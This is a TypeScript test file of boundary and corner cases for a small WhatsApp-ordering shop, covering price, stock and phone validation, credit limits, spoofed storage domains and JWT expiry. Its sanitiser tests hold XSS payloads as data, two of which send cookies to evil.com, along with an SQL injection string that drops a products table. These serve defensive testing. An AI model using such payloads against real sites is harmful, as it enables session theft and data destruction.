import { describe, it, expect } from '../framework.ts';
import {
  evaluateCreditBudget,
  CreditLimitExceededError,
  sanitizePhoneNumber,
  sanitizeCustomerText,
  generateWhatsAppOrderUrl,
  computePromptHash,
  verifyMockAdminJwt,
  createMockAdminJwt,
  MAX_CUMULATIVE_CREDIT_BUDGET,
} from '../contracts.ts';

describe('Tier 2: Boundary & Corner Cases', () => {
  // 1. Extreme Numerical Boundaries
  it('T2.1 should reject negative product price (-100.00)', () => {
    const validatePrice = (price: number) => {
      if (typeof price !== 'number' || isNaN(price) || price <= 0) {
        throw new Error('Price must be a positive number');
      }
      return price;
    };

    expect(() => validatePrice(-100.0)).toThrow('Price must be a positive number');
    expect(() => validatePrice(0)).toThrow('Price must be a positive number');
    expect(() => validatePrice(NaN)).toThrow('Price must be a positive number');
    expect(validatePrice(0.01)).toBe(0.01);
  });

  it('T2.2 should reject fractional or negative stock counts', () => {
    const validateStock = (stock: number) => {
      if (!Number.isInteger(stock) || stock < 0) {
        throw new Error('Stock must be a non-negative integer');
      }
      return stock;
    };

    expect(() => validateStock(-5)).toThrow('Stock must be a non-negative integer');
    expect(() => validateStock(3.14159)).toThrow('Stock must be a non-negative integer');
    expect(validateStock(0)).toBe(0);
    expect(validateStock(1000000)).toBe(1000000);
  });

  // 2. XSS & Code Injection Payloads
  it('T2.3 should completely neutralize sophisticated XSS payloads in customer notes', () => {
    const dangerousPayloads = [
      '<script>document.location="http://evil.com/?c="+document.cookie</script>',
      '<img src="invalid" onerror="alert(document.domain)"/>',
      '<svg/onload=fetch("http://evil.com/"+document.cookie)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
    ];

    for (const payload of dangerousPayloads) {
      const sanitized = sanitizeCustomerText(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<svg');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('onload');
    }
  });

  it('T2.4 should strip SQL injection and escaping characters from input strings', () => {
    const sqliInput = "'; DROP TABLE products; SELECT * FROM users WHERE '1'='1";
    const cleaned = sanitizeCustomerText(sqliInput);

    expect(cleaned).not.toContain("'");
    expect(cleaned).not.toContain(';');
    expect(cleaned).toBe('DROP TABLE products SELECT * FROM users WHERE 1=1');
  });

  // 3. String Size Extremes & Unicode Resilience
  it('T2.5 should handle multilingual unicode strings and emoji in product names & notes', () => {
    const orderWithUnicode = {
      productId: 'prod-hoodie',
      productName: 'CYRUX HOODIE 🖤 Özel Tasarım ğüşıöç 🧥 東京',
      price: 200,
      currency: 'TRY',
      customerNotes: 'Acil kargo lütfen 🚀 Kapıya bırakın.',
    };

    const url = generateWhatsAppOrderUrl('+905321234567', orderWithUnicode);
    expect(url).toContain(encodeURIComponent('CYRUX HOODIE 🖤 Özel Tasarım ğüşıöç 🧥 東京'));
    expect(url).toContain(encodeURIComponent('Acil kargo lütfen 🚀 Kapıya bırakın.'));
  });

  it('T2.6 should safely truncate or reject excessively large strings (50,000 characters)', () => {
    const hugeString = 'X'.repeat(50000);
    const validateNotesLength = (notes: string) => {
      if (notes.length > 500) {
        throw new Error('Notes exceed max 500 characters');
      }
      return notes;
    };

    expect(() => validateNotesLength(hugeString)).toThrow('Notes exceed max 500 characters');
  });

  // 4. Phone Sanitization Corner Cases
  it('T2.7 should handle messy international phone strings with spaces, dots, dashes, and parentheses', () => {
    expect(sanitizePhoneNumber('+90 (532) 123-45.67')).toBe('905321234567');
    expect(sanitizePhoneNumber('+1-800-CYRUX-SHOP'.replace(/[A-Z]/g, ''))).toBe('1800');
    expect(sanitizePhoneNumber('0044 20 7946 0999')).toBe('00442079460999');
  });

  it('T2.8 should throw clear error on empty phone or non-digit input', () => {
    expect(() => sanitizePhoneNumber('')).toThrow('no digits found');
    expect(() => sanitizePhoneNumber('    ')).toThrow('no digits found');
    expect(() => sanitizePhoneNumber('---()---')).toThrow('no digits found');
  });

  // 5. Credit Guard Boundary & Off-By-One Invariants
  it('T2.9 should handle exact boundary at 22,999 credits used (+1 credit -> PASS; +2 credits -> FAIL)', () => {
    const current = 22999;

    // +1 credit should pass exactly landing on 23,000
    const passEval = evaluateCreditBudget(current, 1);
    expect(passEval.allowed).toBe(true);
    expect(passEval.newTotal).toBe(23000);
    expect(passEval.remaining).toBe(1);

    // +2 credits should fail landing on 23,001
    expect(() => evaluateCreditBudget(current, 2)).toThrow(CreditLimitExceededError);
  });

  it('T2.10 should reject prompt hash computation when prompt is only whitespace or null', () => {
    const hash1 = computePromptHash('   ', 'image');
    const hash2 = computePromptHash('', 'image');
    expect(hash1).toBe(hash2); // Whitespace trims to empty string
    expect(hash1).toHaveLength(64);
  });

  // 6. Security & Subdomain Spoofing Boundaries
  it('T2.11 should reject spoofed Vercel Blob delete domain (e.g. evil-blob.vercel-storage.com.attacker.com)', () => {
    const isLegitVercelBlobUrl = (rawUrl: string): boolean => {
      try {
        const u = new URL(rawUrl);
        return u.protocol === 'https:' && u.hostname.endsWith('.blob.vercel-storage.com');
      } catch {
        return false;
      }
    };

    const genuine = 'https://cyrux-store.public.blob.vercel-storage.com/asset.png';
    const spoofed1 = 'https://blob.vercel-storage.com.attacker.com/asset.png';
    const spoofed2 = 'https://attacker-blob.vercel-storage.com.org/asset.png';
    const httpFake = 'http://cyrux.public.blob.vercel-storage.com/asset.png';

    expect(isLegitVercelBlobUrl(genuine)).toBe(true);
    expect(isLegitVercelBlobUrl(spoofed1)).toBe(false);
    expect(isLegitVercelBlobUrl(spoofed2)).toBe(false);
    expect(isLegitVercelBlobUrl(httpFake)).toBe(false); // Must be HTTPS
  });

  // 7. JWT Expired & Time-Traveling Boundaries
  it('T2.12 should reject JWT tokens expiring 1 second in the past', () => {
    const secret = 'super-secret-key-32-characters-minimum!!';
    const oneSecAgo = Math.floor(Date.now() / 1000) - 1;
    const token = createMockAdminJwt(secret, { sub: 'admin', role: 'admin', exp: oneSecAgo });

    const result = verifyMockAdminJwt(token, secret);
    expect(result.valid).toBe(false);
    expect(result.error).toBe('Token expired');
  });
}, { tier: 2 });
